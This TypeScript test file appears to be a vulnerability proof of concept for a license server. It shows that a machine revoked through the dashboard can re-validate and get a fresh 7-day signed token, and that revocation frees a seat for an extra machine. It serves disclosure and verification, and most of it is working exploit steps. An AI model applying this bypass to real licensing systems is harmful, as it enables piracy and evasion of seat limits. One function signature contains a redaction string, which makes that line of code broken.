/**
 * p10-012 PoC — revoked machine resurrects itself.
 * NOT part of the project test suite.
 *
 * Runs the REAL worker (src/worker.ts) in workerd against local D1 with the
 * production migration schema. Vulnerable path: handlers/license.ts
 * registerOrTouchMachine() existing-machine lookup:
 *
 *   `SELECT id FROM machines WHERE license_id = ? AND machine_id = ?`   (no `AND is_active = 1`)
 *
 * The sibling seat-count query correctly filters `is_active = 1`
 * (license.ts:288), and the dashboard revoke endpoint flips the row to
 * `is_active = 0` (dashboard.ts:191). But once a row exists, the touch path
 * unconditionally bumps last_seen_at and returns null (= "valid"), so
 * validateLicense proceeds to generateLicenseJWT — a fresh 7-day offline JWT
 * minted FOR A REVOKED MACHINE. Revocation also drops the seat count, so a
 * second machine fits on a max_machines=1 license simultaneously.
 *
 * Chain (all through real HTTP handlers):
 *   1. POST /api/validate-license        -> machine M activated, JWT #1
 *   2. POST /api/machines/revoke         -> dashboard operator revokes M
 *      (authenticated via seeded sessions row; handler sets is_active=0)
 *   3. POST /api/validate-license (same key + machine_id)
 *        expected: rejection. actual: valid=true + fresh signed 7-day JWT
 *   4. POST /api/validate-license (different machine_id)
 *        -> also valid=true: revoked machine freed its seat
 */
import '../src/cloudflare-test.d.ts';
import { describe, it, expect, beforeAll } from 'vitest';
import { env, createExecutionContext, waitOnExecutionContext } from 'cloudflare:test';
import worker from '../src/worker';

const CUSTOMER_ID = 'p10-012-cust';
const LICENSE_ID = 'p10-012-lic';
const LICENSE_KEY = 'lic-p10-012-resurrect-key';
const SESSION_TOKEN = 'p10-012-dash-session-token-000000000000ffff';
const VICTIM_MACHINE = 'victim-machine-dashboard-revoked';
const SECOND_MACHINE = 'attacker-second-freebie-machine';
const MAX_MACHINES = 1;

function req(path: string, body: string, headers?: Record<string, string>): Request {
  return new Request(`http://localhost${path}`, {
    method: 'POST',
    headers: new Headers({ 'Content-Type': 'application/json', ...headers }),
    body,
  });
}

async function dispatch(request: Request): Promise<Response> {
  const context = createExecutionContext();
  const response = await worker.fetch(request, env, context);
  await waitOnExecutionContext(context);
  return response;
}

function validate(licenseKey: string, machineId: string): Request {
  return req(
    '/api/validate-license',
    JSON.stringify({
      license_key: licenseKey,
      machine_id: machineId,
      user_name: 'attacker',
      user_email: 'attacker@resurrect.test',
    })
  );
}

function revoke(machineId: string): Request {
  return req(
    '/api/machines/revoke',
    JSON.stringify({ machine_id: machineId }),
    { Authorization: `Bearer ${SESSION_TOKEN}` }
  );
}

type ValidatePayload = {
  valid: boolean;
  error?: string;
  token?: string;
  tier?: string;
  max_machines?: number;
  features?: string[];
};

function jwtClaims(token: [REDACTED:secret] Record<string, unknown> | null {
  const part = token.split('.')[1];
  if (part === undefined) return null;
  try {
    return JSON.parse(atob(part.replace(/-/g, '+').replace(/_/g, '/')));
  } catch {
    return null;
  }
}

describe('p10-012: revoked machine resurrects itself', () => {
  beforeAll(async () => {
    // Default production posture: HS256 signing via JWT_SECRET.
    (env as Record<string, unknown>).JWT_SECRET = 'p11-test-jwt-secret';

    await env.DB.prepare(
      `INSERT INTO customers (id, email, company, tier) VALUES (?, ?, 'Resurrect Co', 'pro')`
    )
      .bind(CUSTOMER_ID, 'owner@resurrect.test')
      .run();
    await env.DB.prepare(
      `INSERT INTO licenses (id, customer_id, license_key, tier, status, max_seats, max_machines, expires_at)
       VALUES (?, ?, ?, 'pro', 'active', ?, ?, NULL)`
    )
      .bind(LICENSE_ID, CUSTOMER_ID, LICENSE_KEY, MAX_MACHINES, MAX_MACHINES)
      .run();
    // Dashboard session for the license owner so step 2 hits the REAL
    // authenticated revoke handler (/api/machines/revoke).
    await env.DB.prepare(
      `INSERT INTO sessions (id, customer_id, token, ip_address, user_agent, expires_at)
       VALUES (?, ?, ?, '127.0.0.1', 'poc', datetime('now', '+1 day'))`
    )
      .bind('p10-012-sess', CUSTOMER_ID, SESSION_TOKEN)
      .run();
  });

  it('step 1: machine activates normally on a max_machines=1 pro license', async () => {
    const res = await dispatch(validate(LICENSE_KEY, VICTIM_MACHINE));
    expect(res.status).toBe(200);
    const payload = (await res.json()) as ValidatePayload;
    const claims = payload.valid && payload.token ? jwtClaims(payload.token) : null;
    console.log(
      `p10-012 step1: initial activation valid=${payload.valid} tier=${payload.tier} max_machines=${payload.max_machines} jwt_mid=${claims?.mid}`
    );
    expect(payload.valid).toBe(true);
    expect(payload.token).toBeTruthy();
    expect(claims?.mid).toBe(VICTIM_MACHINE);
  });

  it('step 2: dashboard operator revokes the machine via /api/machines/revoke', async () => {
    const res = await dispatch(revoke(VICTIM_MACHINE));
    expect(res.status).toBe(200);
    const payload = (await res.json()) as { success: boolean };
    const row = await env.DB.prepare(
      `SELECT machine_id, is_active, revoked_at FROM machines WHERE license_id = ? AND machine_id = ?`
    )
      .bind(LICENSE_ID, VICTIM_MACHINE)
      .first<{ machine_id: string; is_active: number; revoked_at: string | null }>();
    console.log(
      `p10-012 step2: revoke endpoint success=${payload.success}; db truth: is_active=${row?.is_active} revoked_at=${row?.revoked_at}`
    );
    expect(payload.success).toBe(true);
    expect(row?.is_active).toBe(0);
  });

  it('step 3 EXPLOIT: revoked machine re-validates and gets a fresh 7-day JWT; its seat is freed', async () => {
    // 3a. Same license key + same (now revoked) machine id.
    const res = await dispatch(validate(LICENSE_KEY, VICTIM_MACHINE));
    const payload = (await res.json()) as ValidatePayload;
    const claims = payload.valid && payload.token ? jwtClaims(payload.token) : null;

    let daysValid = -1;
    if (claims && typeof claims.exp === 'number' && typeof claims.iat === 'number') {
      daysValid = Math.round(((claims.exp as number) - (claims.iat as number)) / 86400);
    }
    console.log(
      `p10-012 RESURRECTION: revoked machine re-validated valid=${payload.valid}${payload.error ? ` error="${payload.error}"` : ''} fresh_signed_jwt=${payload.token ? 'yes' : 'no'} jwt_mid=${claims?.mid} jwt_validity_days=${daysValid} tier=${claims?.tier} features=${Array.isArray(claims?.features) ? (claims.features as string[]).length : '?'}`
    );

    // 3b. Revocation dropped the active-seat count, so a brand-new machine
    //     also activates on this max_machines=1 license right now.
    const res2 = await dispatch(validate(LICENSE_KEY, SECOND_MACHINE));
    const payload2 = (await res2.json()) as ValidatePayload;
    console.log(
      `p10-012 SEAT-FREED: second distinct machine activation valid=${payload2.valid} while revoked machine still holds a valid JWT (max_machines=${MAX_MACHINES})`
    );

    const rows = await env.DB.prepare(
      `SELECT machine_id, is_active FROM machines WHERE license_id = ? ORDER BY machine_id`
    )
      .bind(LICENSE_ID)
      .all<{ machine_id: string; is_active: number }>();
    console.log(`p10-012 db-truth: ${JSON.stringify(rows.results)}`);

    // Security effect assertions.
    expect(payload.valid).toBe(true); // revoked machine NOT rejected
    expect(payload.token).toBeTruthy(); // fresh signed offline JWT minted
    expect(claims?.mid).toBe(VICTIM_MACHINE);
    expect(daysValid).toBeGreaterThanOrEqual(6); // ~7-day validity
    expect(payload2.valid).toBe(true); // extra free seat on top
  });
});
